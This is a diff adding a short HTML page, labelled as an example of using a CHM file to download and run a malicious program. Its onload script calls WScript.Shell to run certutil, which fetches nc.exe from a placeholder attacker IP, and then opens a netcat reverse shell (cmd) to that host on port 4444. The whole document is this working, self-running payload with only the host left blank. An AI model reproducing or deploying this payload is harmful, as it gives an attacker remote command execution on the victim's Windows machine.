@@ -1,0 +1,17 @@
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<title>Example</title>
+<script type="text/javascript">
+function downloadAndRun() {
+  var command = "cmd.exe /c certutil -urlcache -split -f http://IP地址/payload/nc.exe && nc.exe -e cmd IP地址 4444";  //嵌入攻击者主机IP地址
+  var wsh = new ActiveXObject("WScript.Shell");
+  wsh.Run(command, 0, false);
+}
+</script>
+</head>
+<body onload="downloadAndRun()">
+<h1>Example</h1>
+<p>This is an example of using CHM file to download and run a malicious program using certutil.</p>
+</body>
+</html>
